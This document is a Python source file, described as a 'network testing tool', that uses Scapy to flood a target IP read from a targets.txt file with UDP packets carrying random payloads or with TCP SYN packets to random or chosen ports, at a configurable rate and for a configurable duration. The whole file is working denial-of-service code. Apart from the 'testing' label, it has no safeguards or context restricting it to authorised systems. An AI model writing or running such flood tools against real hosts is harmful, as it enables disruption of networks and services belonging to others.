from scapy.all import *
import sys
import time
import random
import argparse

def parse_arguments():
    parser = argparse.ArgumentParser(description='Network testing tool using Scapy')
    parser.add_argument('--type', choices=['udp', 'syn'], default='udp',
                        help='Flood type: udp or syn')
    parser.add_argument('--rate', type=int, default=100,
                        help='Packets per second (default: 100)')
    parser.add_argument('--duration', type=int, default=30,
                        help='Test duration in seconds (default: 30)')
    parser.add_argument('--port', type=int, default=0,
                        help='Target port (default: random ports)')
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    # Read target IPs from a file (one per line)
    try:
        with open('targets.txt', 'r') as f:
            target_ips = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Error: targets.txt file not found")
        sys.exit(1)

    # Use the first target IP from the file
    if not target_ips:
        print("No target IP found in targets.txt")
        sys.exit(1)

    TARGET_IP = target_ips[0]
    DURATION = args.duration
    PACKET_RATE = args.rate
    TEST_TYPE = args.type
    TARGET_PORT = args.port

    print(f"Starting {TEST_TYPE.upper()} flood to {TARGET_IP}")
    print(f"Test started at {time.strftime('%H:%M:%S', time.localtime(time.time()))}.")
    print(f"Duration: {DURATION} seconds")
    print(f"Packet rate: {PACKET_RATE} packets/second")
    if TARGET_PORT:
        print(f"Target port: {TARGET_PORT}")
    else:
        print("Target port: Random")

    # Disable verbose output from Scapy
    conf.verb = 0

    end_time = time.time() + DURATION
    sent_count = 0

    try:
        while time.time() < end_time:
            # Choose port (specific or random)
            if TARGET_PORT:
                dst_port = TARGET_PORT
            else:
                dst_port = random.randint(1, 65535)
            
            # Create packet based on selected flood type
            if TEST_TYPE == "udp":
                # UDP flood: sending UDP packets with random payload
                payload = Raw(load=RandString(size=random.randint(64, 1400)))
                packet = IP(dst=TARGET_IP)/UDP(dport=dst_port)/payload
            
            elif TEST_TYPE == "syn":
                # SYN flood: sending TCP SYN packets
                # Using random source ports and sequence numbers
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(1000000, 9000000)
                packet = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=dst_port, flags="S", seq=seq_num)
                
            # Send the packet
            send(packet)
            sent_count += 1
            
            # Print status every 100 packets
            if sent_count % 100 == 0:
                elapsed = time.time() - (end_time - DURATION)
                packets_per_sec = sent_count / elapsed if elapsed > 0 else 0
                print(f"Sent {sent_count} packets... ({packets_per_sec:.2f} packets/sec)")
            
            # Sleep to control packet rate
            time.sleep(1 / PACKET_RATE)

    except KeyboardInterrupt:
        print("\nTest stopped by user.")
    except Exception as e:
        print(f"\nError: {e}")
    finally:
        elapsed_time = min(time.time() - (end_time - DURATION), DURATION)
        print("\nTest completed.")
        print(f"Test ended at {time.strftime('%H:%M:%S', time.localtime(time.time()))}.")
        print(f"Total packets sent: {sent_count}")
        print(f"Actual packets/second: {sent_count / elapsed_time:.2f}")

if __name__ == "__main__":
    main()